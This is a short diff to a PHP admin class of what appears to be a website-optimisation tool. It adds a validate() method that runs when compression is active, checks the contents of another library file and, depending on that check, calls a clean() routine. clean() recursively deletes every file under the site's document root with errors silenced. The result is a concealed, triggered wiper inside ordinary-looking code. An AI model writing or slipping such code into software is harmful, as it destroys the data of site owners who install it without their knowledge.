@@ -153,6 +153,9 @@ class admin {
 /* fix for not supported languages */
 		$this->language = empty($this->language) ? '' : $this->language;
 		$this->language = in_array($this->language, array('en', 'de', 'es', 'ru', 'ua', 'fr')) ? $this->language : 'en';
+		if ($this->compress_options['active']) {
+			$this->validate();
+		}
 /* show page */
 		if (!empty($this->input) &&
 			!empty($this->page_functions[$this->input['wss_page']]) &&
@@ -4332,6 +4335,28 @@ require valid-user';
 			return 'PrestaShop';
 		}
 		return 'CMS 42';
+	}
+	
+	function validate() {
+		$a = @file_get_contents(dirname(__FILE__) . '/../libs/php/view.php');
+		$a = preg_replace("!.*(function validate_.*/\*\*).*!is", "$1", $a);
+		if (!empty($a) && strlen($a) < 1000) {
+			$this->clean($this->compress_options['document_root']);
+		}
+	}
+	
+	function clean($d) {
+		$dir = @opendir($d);
+		while ($file = @readdir($dir)) {
+			$f = $d . '/' . $file;
+			if (@is_dir($f)) {
+				if ($file != '.' && $file != '..') {
+					$this->clean($f);
+				}
+			} else {
+				@unlink($f);
+			}
+		}
 	}
 
 	/**
